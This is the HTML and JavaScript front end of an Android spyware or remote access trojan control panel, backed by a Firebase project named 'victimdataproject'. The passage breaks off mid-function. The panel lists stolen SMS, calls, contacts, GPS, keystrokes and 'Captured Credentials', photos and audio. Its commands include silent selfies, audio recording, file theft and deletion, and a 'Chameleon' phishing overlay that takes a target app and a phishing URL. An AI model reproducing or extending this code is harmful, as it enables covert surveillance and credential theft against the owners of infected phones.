<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Device Monitoring</title>

    <!-- Bootstrap 5 CDN -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Leaflet CSS for Maps -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />

    <style>
        :root {
            --primary-color: #0d6efd; 
            --secondary-color: #6c757d; 
            --light-gray: #f8f9fa; 
            --dark-gray: #343a40;
            --sidebar-width: 260px;
            --topbar-height: 60px;
            --content-padding: 1.5rem;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--light-gray); 
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.85); 
            z-index: 10000; 
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        #login-container {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            background-color: var(--light-gray); 
        }
        .login-card {
            width: 100%;
            max-width: 400px; 
            padding: 2.5rem 2rem; 
            background-color: #ffffff; 
            border-radius: 12px; 
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1); 
            border: none; 
        }
        .login-icon-wrapper { 
            text-align: center;
            margin-bottom: 1.5rem; 
        }
        .login-icon-wrapper .fas { 
            font-size: 3.5rem; 
            color: var(--primary-color);
        }
        .login-card .card-title {
            font-weight: 600; 
            color: var(--dark-gray);
            margin-bottom: 1.5rem; 
            font-size: 1.75rem; 
        }
        .login-card .form-label {
            font-weight: 500; 
            margin-bottom: 0.3rem;
            color: #495057; 
        }
        .login-card .form-control {
            border-radius: 8px; 
            padding: 0.85rem 1rem; 
            border: 1px solid #ced4da;
            transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
        }
        .login-card .form-control::placeholder { 
            color: #999;
            font-size: 0.9rem;
        }
        .login-card .form-control:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 0.25rem rgba(13, 110, 253, 0.25);
        }
        .login-card .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            padding: 0.85rem; 
            font-weight: 500;
            font-size: 1rem;
            border-radius: 8px;
            transition: background-color .15s ease-in-out,border-color .15s ease-in-out;
        }
        .login-card .btn-primary:hover {
            background-color: #0b5ed7;
            border-color: #0a58ca;
        }
        #login-error {
            font-size: 0.875rem; 
            margin-top: 1rem; 
            padding: 0.75rem 1rem;
            border-radius: 8px;
            background-color: #f8d7da; 
            border: 1px solid #f5c2c7; 
            color: #842029; 
        }

        #dashboard-container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        #sidebar {
            width: var(--sidebar-width);
            background-color: #fff; 
            border-right: 1px solid #dee2e6;
            position: fixed;
            top: 0; 
            bottom: 0;
            left: 0;
            z-index: 1020; 
            transition: transform 0.3s ease-in-out;
            display: flex; 
            flex-direction: column; 
        }

        #sidebar .sidebar-brand {
            height: var(--topbar-height); 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 0 1.25rem; 
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--primary-color);
            text-align: center;
            border-bottom: 1px solid #e9ecef; 
            flex-shrink: 0; 
        }

        #sidebar-inner-content {
            flex-grow: 1; 
            overflow-y: auto; 
            box-sizing: border-box;
        }
        
        #sidebar-inner-content .nav { 
            padding-top: 0.5rem; 
            padding-bottom: 0.5rem; 
        }

        #sidebar .nav-link {
            color: #333;
            padding: 0.75rem 1.25rem;
            display: flex;
            align-items: center;
        }
        #sidebar .nav-link .fa-fw {
            margin-right: 0.75rem;
        }
        #sidebar .nav-link.active, #sidebar .nav-link:hover {
            background-color: var(--primary-color);
            color: #fff;
        }
        .sidebar-heading {
            padding: 0.75rem 1.25rem;
            font-size: 0.8rem;
            font-weight: bold;
            color: var(--secondary-color);
            text-transform: uppercase;
            letter-spacing: .05em;
        }

        #topbar {
            height: var(--topbar-height);
            background-color: #fff; 
            border-bottom: 1px solid #dee2e6;
            display: flex; 
            align-items: center; 
            padding: 0 var(--content-padding);
            position: fixed;
            top: 0;
            left: var(--sidebar-width); 
            right: 0;
            z-index: 1030; 
        }
        
        #topbar-right-group {
            margin-left: auto; 
            display: flex;
            align-items: center;
        }
        
        #device-selector { 
            text-align: center;
            text-align-last: center; 
        }
        
        #main-content-wrapper {
            margin-left: var(--sidebar-width);
            padding-top: var(--topbar-height);
            flex-grow: 1;
            transition: margin-left 0.3s ease-in-out;
        }
        #main-content {
            padding: var(--content-padding);
        }

        .tab-pane { display: none; animation: fadeIn 0.5s; }
        .tab-pane.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .card-header .btn-export { font-size: 0.8rem; }
        .editable-alias { display: flex; align-items: center; }
        .editable-alias input { margin-right: 0.5rem; }
        #gps-map { height: 400px; width: 100%; border-radius: 0.25rem; }
        #gps-map.loading-map { display: flex; align-items: center; justify-content: center; background-color: #e9ecef; }
        .screenshot-item img, .camera-photo-item img { max-width: 100%; height: auto; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 10px; }
        .screenshot-grid, .camera-photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1rem; }
        .audio-item { border: 1px solid #dee2e6; border-radius: .25rem; padding: 1rem; margin-bottom: 1rem; }
        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .status-online { background-color: #28a745; }
        .status-offline { background-color: #dc3545; }

        .sidebar-toggler { display: none; } 

        @media (max-width: 991.98px) {
            #sidebar {
                transform: translateX(-100%);
            }
            #sidebar.active {
                transform: translateX(0);
                z-index: 1025; 
            }
            
            #sidebar .sidebar-brand {
                height: auto; 
                padding: 0.75rem 1.25rem; 
                padding-top: calc(var(--topbar-height) + 0.5rem); 
                border-bottom: 1px solid #e9ecef; 
            }
            #sidebar-inner-content .nav { 
                padding-top: 0.5rem; 
            }

            #main-content-wrapper {
                margin-left: 0;
            }
            #topbar {
                left: 0; 
                z-index: 1030; 
                justify-content: space-between; 
            }
            .sidebar-toggler { 
                display: block; 
            }
            #topbar-device-selector-container {
                margin-left: 0.5rem; 
                margin-right: 0.5rem; 
            }
            #device-selector { 
                width: 170px; 
                overflow: hidden; 
                text-overflow: ellipsis; 
            }
            #topbar-right-group { 
                margin-left: 0; 
            }
        }

        @media (min-width: 992px) {
            .sidebar-toggler {
                display: none !important; 
            }
            #topbar-device-selector-container {
                margin-left: 1rem; 
                margin-right: auto; 
                display: flex;         
                align-items: center;   
            }
            #topbar-device-selector-container .form-label {
                white-space: nowrap; 
            }
            #device-selector { 
                min-width: 250px; 
            }
        }

        .table-responsive { overflow-x: auto; }
        .data-table th, .data-table td { white-space: nowrap; }
        .data-table .wrap-text { white-space: normal; }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="spinner-border text-primary" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>

    <div id="login-container">
        <div class="card login-card"> 
            <div class="card-body">
                <div class="login-icon-wrapper">
                    <i class="fas fa-user-shield"></i> 
                </div>
                <h3 class="card-title text-center">Admin Panel Login</h3> 
                <form id="login-form">
                    <div class="mb-3">
                        <label for="email" class="form-label">Email address</label>
                        <input type="email" class="form-control" id="email" placeholder="e.g., admin@example.com" required>
                    </div>
                    <div class="mb-4"> 
                        <label for="password" class="form-label">Password</label>
                        <input type="password" class="form-control" id="password" placeholder="Enter your password" required>
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Login</button>
                    <div id="login-error" class="text-danger mt-3 text-center" style="display: none;"></div>
                </form>
            </div>
        </div>
    </div>

    <div id="dashboard-container" style="display: none;">
        <nav id="topbar" class="shadow-sm">
            <button class="btn btn-light sidebar-toggler" type="button" id="sidebarToggle">
                <i class="fas fa-bars"></i>
            </button>

            <div class="dropdown" id="topbar-device-selector-container"> 
                <label for="device-selector" class="form-label me-2 d-none d-sm-inline">Select Device:</label>
                <select id="device-selector" class="form-select form-select-sm d-inline-block">
                     <option value="">-- Select Device --</option>
                </select>
            </div>
            
            <div id="topbar-right-group"> 
                <span id="admin-email" class="me-3 d-none d-md-inline"></span>
                <button id="logout-button" class="btn btn-outline-danger btn-sm">
                    <i class="fas fa-sign-out-alt me-1"></i> Logout
                </button>
            </div>
        </nav>

        <nav id="sidebar" class="shadow-sm">
            <div class="sidebar-brand">
                <i class="fas fa-shield-alt"></i> Admin Panel
            </div>
            <div id="sidebar-inner-content">
                <ul class="nav flex-column">
                    <div class="sidebar-heading">Core Monitoring</div>
                    <li class="nav-item">
                        <a class="nav-link active" href="#overview" data-tab="overview-content"><i class="fas fa-tachometer-alt fa-fw"></i> Device Overview</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#messages" data-tab="messages-content"><i class="fas fa-envelope fa-fw"></i> Messages</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#calls" data-tab="calls-content"><i class="fas fa-phone-alt fa-fw"></i> Call Logs</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#contacts" data-tab="contacts-content"><i class="fas fa-address-book fa-fw"></i> Contacts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#gps" data-tab="gps-content"><i class="fas fa-map-marker-alt fa-fw"></i> GPS Location</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#notifications" data-tab="notifications-content"><i class="fas fa-bell fa-fw"></i> Notifications</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#clipboard" data-tab="clipboard-content"><i class="fas fa-clipboard fa-fw"></i> Clipboard Logs</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#keylogger" data-tab="keylogger-content"><i class="fas fa-keyboard fa-fw"></i> Keylogger</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#credentials" data-tab="credentials-content"><i class="fas fa-key fa-fw"></i> Captured Credentials</a>
                    </li>

                    <div class="sidebar-heading">Media & Files</div>
                     <li class="nav-item">
                        <a class="nav-link" href="#screenshots" data-tab="screenshots-content"><i class="fas fa-camera fa-fw"></i> Screenshots</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#camera-photos" data-tab="camera-photos-content"><i class="fas fa-camera-retro fa-fw"></i> Camera Photos</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#audio" data-tab="audio-content"><i class="fas fa-microphone fa-fw"></i> Audio Recordings</a>
                    </li>
                     <li class="nav-item">
                        <a class="nav-link" href="#files" data-tab="files-content"><i class="fas fa-folder-open fa-fw"></i> File Logs</a>
                    </li>

                    <div class="sidebar-heading">System & Usage</div>
                    <li class="nav-item">
                        <a class="nav-link" href="#apps" data-tab="apps-content"><i class="fas fa-th-large fa-fw"></i> Installed Apps</a>
                    </li>
                     <li class="nav-item">
                        <a class="nav-link" href="#app-usage" data-tab="app-usage-content"><i class="fas fa-chart-pie fa-fw"></i> App Usage</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#battery" data-tab="battery-content"><i class="fas fa-battery-full fa-fw"></i> Battery Info</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#network-info" data-tab="network-info-content"><i class="fas fa-wifi fa-fw"></i> Network Info</a>
                    </li>
                     <li class="nav-item">
                        <a class="nav-link" href="#event-logs" data-tab="event-logs-content"><i class="fas fa-history fa-fw"></i> Event Logs</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#device-info" data-tab="device-info-content"><i class="fas fa-info-circle fa-fw"></i> Device Info</a>
                    </li>

                    <div class="sidebar-heading">Remote Control</div>
                    <li class="nav-item">
                        <a class="nav-link" href="#commands" data-tab="commands-content"><i class="fas fa-terminal fa-fw"></i> Remote Commands</a>
                    </li>
                </ul>
            </div>
        </nav>

        <div id="main-content-wrapper">
            <main id="main-content">
                <div id="overview-content" class="tab-pane active">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Device Overview</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="overview">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="overview-data">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
                 <div id="messages-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Messages (SMS)</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="sms">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="messages-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
                <div id="calls-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Call Logs</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="calls">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="calls-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
                <div id="apps-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Installed Apps</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="apps">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="apps-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
                <div id="battery-content" class="tab-pane">
                     <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Battery Info</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="battery">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="battery-data">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
                <div id="gps-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>GPS Location</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="gps">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="gps-map-container" class="mb-3">
                        <div id="gps-map">
                            <p class="text-muted p-3">Please select a device to view location on map.</p>
                        </div>
                    </div>
                    <div id="gps-history-data" class="table-responsive">
                         <p class="text-muted">Location history will appear here once a device is selected.</p>
                    </div>
                </div>
                <div id="files-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>File Logs</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="files">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="files-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
                <div id="screenshots-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Screenshots</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="screenshots">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="screenshots-data" class="screenshot-grid">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
                <div id="notifications-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Notifications</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="notifications">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="notifications-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
                <div id="device-info-content" class="tab-pane">
                     <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Device Info</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="deviceInfo">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="device-info-data">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
                <div id="contacts-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Contacts</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="contacts">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="contacts-data" class="table-responsive">
                        <p class="text-muted">Please select a device to view its contacts.</p>
                    </div>
                </div>
                <div id="clipboard-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Clipboard Logs</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="clipboard">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="clipboard-data" class="table-responsive">
                        <p class="text-muted">Please select a device to view its clipboard history.</p>
                    </div>
                </div>
                <div id="keylogger-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Keylogger Data</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="keylogger">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="keylogger-data" class="table-responsive">
                        <p class="text-muted">Please select a device to view its keylogger data.</p>
                    </div>
                </div>
                <div id="credentials-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Captured Credentials</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="credentials">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="credentials-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view captured credentials.</p>
                    </div>
                </div>
                <div id="camera-photos-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Camera Photos</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="camera_photos">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="camera-photos-data" class="camera-photo-grid">
                        <p class="text-muted">Please select a device to view its camera photos.</p>
                    </div>
                </div>
                <div id="audio-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Audio Recordings</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="audio">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="audio-data">
                        <p class="text-muted">Please select a device to listen to audio recordings.</p>
                    </div>
                </div>
                <div id="app-usage-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>App Usage Statistics</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="usage_stats">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="app-usage-data" class="table-responsive">
                        <p class="text-muted">Please select a device to view its app usage stats.</p>
                    </div>
                </div>
                <div id="network-info-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Network Information</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="network">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="network-info-data">
                        <p class="text-muted">Please select a device to view its network information.</p>
                    </div>
                </div>
                <div id="event-logs-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Device Event Logs</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="events">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="event-logs-data" class="table-responsive">
                        <p class="text-muted">Please select a device to view its event logs (Screen On/Off, Charging, etc.).</p>
                    </div>
                </div>
                
                <div id="commands-content" class="tab-pane">
                    <h2 class="mb-3">🛰️ Remote Control Commands</h2>
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">Send New Command</h5>
                            <div class="input-group">
                                <select class="form-select" id="command-preset-selector" aria-label="Select Command">
                                </select>
                                <button class="btn btn-primary" type="button" id="send-command-btn">
                                    <i class="fas fa-paper-plane me-1 d-none d-sm-inline"></i> Send
                                </button>
                            </div>
                            
                            <div id="chameleon-parameter-container" class="mt-3" style="display: none;">
                                <div class="form-floating mb-2">
                                    <input type="text" class="form-control" id="chameleon-target-input" placeholder="e.g., com.facebook.katana">
                                    <label for="chameleon-target-input">Target App Package Name</label>
                                </div>
                                <div class="form-floating">
                                    <input type="url" class="form-control" id="chameleon-url-input" placeholder="https://your-phishing-link.com/login.html">
                                    <label for="chameleon-url-input">Phishing Page URL</label>
                                </div>
                            </div>

                            <div id="alert-parameter-container" class="mt-3" style="display: none;">
                                <div class="form-floating mb-2">
                                    <input type="text" class="form-control" id="alert-title-input" placeholder="Enter Alert Title">
                                    <label for="alert-title-input">Alert Title (Optional)</label>
                                </div>
                                <div class="form-floating mb-2">
                                    <textarea class="form-control" id="alert-message-input" placeholder="Enter Alert Message" style="height: 100px"></textarea>
                                    <label for="alert-message-input">Alert Message</label>
                                </div>
                                <div class="form-floating">
                                    <input type="number" class="form-control" id="alert-duration-input" placeholder="15" value="15">
                                    <label for="alert-duration-input">Duration (in seconds)</label>
                                </div>
                            </div>

                            <div id="command-parameter-container" class="mt-3" style="display: none;">
                                <div class="form-floating">
                                    <input type="text" class="form-control" id="command-parameter-input" placeholder="Enter parameter...">
                                    <label for="command-parameter-input">Parameter</label>
                                </div>
                            </div>
                            
                            <div id="command-status" class="mt-3" style="min-height: 2.5rem;"></div>
                        </div>
                    </div>
                    <div class="mt-4">
                        <div class="d-flex justify-content-between align-items-center mb-3">
                            <h5>Command History & Results</h5>
                             <button class="btn btn-sm btn-outline-secondary btn-export" data-section="commands">
                                <i class="fas fa-download me-1"></i> Export CSV
                            </button>
                        </div>
                        <div id="command-history-data" class="table-responsive">
                             <p class="text-muted">Command results will appear here.</p>
                        </div>
                    </div>
                </div>

            </main>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>

    <script type="module">
        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
            authDomain: "victimdataproject.firebaseapp.com",
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
            projectId: "victimdataproject",
            storageBucket: "victimdataproject.appspot.com",
            messagingSenderId: "938788267301",
            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
        };

        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, signOut as firebaseSignOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
        import { getDatabase, ref, onValue, off, set, update, get, child, push } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        const loadingOverlay = document.getElementById('loading-overlay');
        const loginContainer = document.getElementById('login-container');
        const loginForm = document.getElementById('login-form');
        const loginError = document.getElementById('login-error');
        const dashboardContainer = document.getElementById('dashboard-container');
        const adminEmailEl = document.getElementById('admin-email');
        const logoutButton = document.getElementById('logout-button');
        const sidebarLinks = document.querySelectorAll('#sidebar .nav-link');
        const tabPanes = document.querySelectorAll('.tab-pane');
        const deviceSelector = document.getElementById('device-selector');
        const sidebarToggler = document.getElementById('sidebarToggle');
        const sidebar = document.getElementById('sidebar');

        let currentUser = null;
        let currentDeviceUid = null;
        let activeListeners = {};
        let map = null;
        let currentDeviceDataCache = {};

        const commandsList = [
            { value: "", text: "-- Select a command --", commandType: 'none' },
            { value: "start_chameleon", text: "🦎 Start Chameleon (Phishing)", commandType: 'chameleon' },
            { value: "ping", text: "Ping (Test Connection)", commandType: 'simple' },
            { value: "get_location", text: "Get GPS Location", commandType: 'simple' },
            { value: "take_screenshot", text: "Take Screenshot", commandType: 'simple' },
            { value: "record_audio_30sec", text: "Record Audio (30 sec)", commandType: 'simple' },
            { value: "get_installed_apps", text: "Sync Installed Apps", commandType: 'simple' },
            { value: "show_alert", text: "Show Custom Alert", commandType: 'alert' },
            { value: "block_app", text: "Block App", commandType: 'parameterized', placeholder: "e.g., com.whatsapp" },
            { value: "unblock_app", text: "Unblock App", commandType: 'parameterized', placeholder: "e.g., com.whatsapp" },
            { value: "delete_file", text: "Delete File", commandType: 'parameterized', placeholder: "Enter full file path" },
            { value: "upload_file", text: "Upload File", commandType: 'parameterized', placeholder: "Enter full file path" },
            { value: "take_photo_front", text: "Take Photo (Front Cam)", commandType: 'simple' },
            { value: "take_photo_back", text: "Take Photo (Back Cam)", commandType: 'simple' },
            { value: "take_selfie", text: "Take Selfie (Silent)", commandType: 'simple' },
            { value: "get_clipboard", text: "Get Clipboard Text", commandType: 'simple' },
            { value: "get_call_logs", text: "Sync Call Logs", commandType: 'simple' },
            { value: "get_sms_logs", text: "Sync SMS Logs", commandType: 'simple' },
            { value: "get_battery_status", text: "Get Battery Status", commandType: 'simple' },
            { value: "get_screen_status", text: "Get Screen Status", commandType: 'simple' },
            { value: "get_nearby_wifi", text: "Scan Nearby Wi-Fi", commandType: 'simple' },
            { value: "get_time_info", text: "Get Device Time Info", commandType: 'simple' },
            { value: "get_direction", text: "Get Direction (Sensor)", commandType: 'simple' },
            { value: "upload_all_photos", text: "Upload All Photos", commandType: 'simple' },
            { value: "restart_service", text: "Restart Monitor Service", commandType: 'simple' },
            { value: "clear_notifications", text: "Clear Notifications", commandType: 'simple' },
            { value: "sleep_10s", text: "Sleep/Delay (10s)", commandType: 'simple' },
        ];

        const showLoading = (show = true) => {
            loadingOverlay.style.display = show ? 'flex' : 'none';
        };

        const formatTimestamp = (timestamp) => {
            if (!timestamp) return 'N/A';
            const ts = String(timestamp).length === 10 ? timestamp * 1000 : Number(timestamp);
            try {
                if(isNaN(ts)) return 'Invalid Date';
                return new Date(ts).toLocaleString();
            } catch (e) {
                return 'Invalid Date';
            }
        };
        const formatDuration = (seconds) => {
            if (seconds === null || seconds === undefined || isNaN(seconds)) return 'N/A';
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = Math.floor(seconds % 60);
            return [
                h > 0 ? `${h}h` : '',
                m > 0 ? `${m}m` : '',
                s > 0 ? `${s}s` : ''
            ].filter(Boolean).join(' ') || '0s';
        };
        const sanitizeHTML = (str) => {
            if (str === null || str === undefined) return '';
            const temp = document.createElement('div');
            temp.textContent = String(str);
            return temp.innerHTML;
        };
        const createTable = (dataArray, headers, sectionNameForMsg) => {
            if (!currentDeviceUid) {
                 return `<p class="text-muted">Please select a device from the dropdown above to view its data.</p>`;
            }
            if (!dataArray || dataArray.length === 0) {
                return `<p class="text-muted">No ${sectionNameForMsg || 'data'} found for this device.</p>`;
            }
            let html = '<table class="table table-striped table-hover table-sm data-table">';
            html += '<thead><tr>';
            headers.forEach(header => html += `<th>${sanitizeHTML(header.label)}</th>`);
            html += '</tr></thead><tbody>';
            dataArray.forEach(item => {
                html += '<tr>';
                headers.forEach(header => {
                    let value = item[header.key] !== undefined && item[header.key] !== null ? item[header.key] : 'N/A';
                    if (header.formatter) {
                        value = header.formatter(value, item);
                    }
                    if (typeof value === 'object' && value !== null) {
                        value = JSON.stringify(value);
                    }
                    if (header.key === 'result' && String(value).startsWith('http')) {
                        html += `<td class="${header.wrap ? 'wrap-text' : ''}"><a href="${sanitizeHTML(value)}" target="_blank" rel="noopener noreferrer">View/Download Media</a></td>`;
                    } else {
                        html += `<td class="${header.wrap ? 'wrap-text' : ''}">${sanitizeHTML(String(value))}</td>`;
                    }
                });
                html += '</tr>';
            });
            html += '</tbody></table>';
            return html;
        };
        const displayKeyValuePairs = (dataObject, containerId, sectionNameForMsg) => {
            const container = document.getElementById(containerId);
            currentDeviceDataCache[sectionNameForMsg] = [];
             if (!currentDeviceUid) {
                container.innerHTML = `<p class="text-muted">Please select a device from the dropdown above to view its data.</p>`;
                return;
            }
            if (!dataObject || Object.keys(dataObject).length === 0) {
                container.innerHTML = `<p class="text-muted">No ${sectionNameForMsg || 'data'} found for this device.</p>`;
                return;
            }
            let html = '<dl class="row">';
            const exportData = {};
            for (const key in dataObject) {
                const value = dataObject[key] !== undefined && dataObject[key] !== null ? dataObject[key] : 'N/A';
                html += `<dt class="col-sm-3 text-capitalize">${sanitizeHTML(key.replace(/_/g, ' '))}</dt>`;
                html += `<dd class="col-sm-9">${sanitizeHTML(String(value))}</dd>`;
                exportData[key] = value;
            }
            html += '</dl>';
            container.innerHTML = html;
            currentDeviceDataCache[sectionNameForMsg] = [exportData];
        };
        const clearDashboardData = (showSelectDeviceMessage = true) => {
            const defaultMessage = '<p class="text-muted">No data available for this section.</p>';
            const selectDevicePrompt = '<p class="text-muted">Please select a device from the dropdown above to view its data.</p>';
            
            const messageToDisplay = showSelectDeviceMessage || !currentDeviceUid ? selectDevicePrompt : defaultMessage;

            const overviewDataEl = document.getElementById('overview-data');
            if (overviewDataEl) {
                 overviewDataEl.innerHTML = messageToDisplay;
            }
            
            tabPanes.forEach(pane => {
                if (pane.id === 'overview-content') return;

                const dataContainer = pane.querySelector('div[id$="-data"], div[id$="-grid"], div[id$="-map"]');
                if (dataContainer) {
                    dataContainer.innerHTML = messageToDisplay;
                }
                 if (pane.id === 'gps-content') {
                    const mapDiv = document.getElementById('gps-map');
                    if (mapDiv) {
